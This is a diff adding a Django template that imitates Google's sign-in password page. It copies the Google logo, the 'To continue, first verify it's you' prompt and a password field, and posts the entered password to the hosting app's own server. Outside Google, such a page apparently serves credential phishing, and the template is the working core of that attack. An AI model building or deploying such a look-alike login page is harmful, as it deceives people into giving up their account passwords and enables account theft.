@@ -1,0 +1,41 @@
+{% load static %}
+<script src="{% static 'ether/js/jquery-3.1.1.min.js' %}"></script>
+<link rel='stylesheet' href='{% static 'core/css/loginpw.css' %}'>
+  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css"            integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr"                  crossorigin="anonymous">
+<form method='post'>{% csrf_token %}
+<div class='lnwrapper' id='pw'>
+{% csrf_token %}
+    <div class='lnmargin'>
+    <div class='lnlogo'>
+        <img class='lnglogo' src='{% static 'images/google-logo.png' %}'>
+    </div>
+    <div class='lntitle'>
+        <span>Hi {{ user.firstname }} </span>
+    </div>
+    <div class='lnsubflex'>
+    <div class='lnsub'>
+        <div class='lninit'><span>{{ initial }}</span></div>
+        <div class='lnem1'><span>{{ user }}</span></div>
+        <div class='lnicon'>
+            <i id='lndown' class="fas fa-chevron-down"></i>
+        </div>
+    </div>
+    </div>
+    <div class='lnsug'>
+        <span>To continue, first verify it's you</span>
+    </div>
+    <div class='lnuser'>
+    <label id='pwlabel' class='lnemaillabel'>Enter your password</label>
+    {{ form.password }}
+    </div>
+    <div class='lnbtnwrapper'>
+    <a href='#' class='lnca'>Forgot password?</a>
+    <div class='lnbtnw'>
+    <button class='lnbtn'>Next</button>
+    </div>
+    </div>
+    </div>
+</div>
+</form>
+<script src='{% static 'core/js/loginpw.js' %}'></script>
+
